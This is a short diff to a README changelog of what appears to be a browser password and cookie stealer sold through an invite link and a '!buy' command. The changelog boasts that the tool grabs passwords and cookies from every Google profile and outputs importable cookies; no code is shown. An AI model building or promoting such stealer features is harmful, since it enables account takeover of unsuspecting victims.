@@ -164,6 +164,9 @@ join [cheataway](https://cheataway.com/invite) and do `!buy` to see preview of t
 ## <a id="changelog"></a>💭 〢 ChangeLog
 
 ```diff
+v1.8.2 ⋮ 2022-06-15
++ fixed unhandled local state file not found
+
 v1.8.1 ⋮ 2022-06-14
 + now grabs passwords and cookies from all google profiles (default, guest profile, profile 1, profile 2, etc...)
 + cookie format is now correct and can be imported (thank you ilylunar)
